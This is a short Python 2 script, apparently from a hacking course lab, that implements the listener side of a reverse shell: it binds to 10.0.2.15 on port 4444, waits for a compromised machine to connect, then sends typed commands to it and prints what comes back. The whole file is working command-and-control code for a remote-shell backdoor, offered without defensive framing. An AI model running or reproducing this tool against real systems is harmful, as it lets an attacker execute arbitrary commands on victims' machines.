#!/usr/bin/env python

import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connection")
        self.connection, address = listener.accept()
        print("[+] Connection detected from " + str(address))

    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1042)

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()
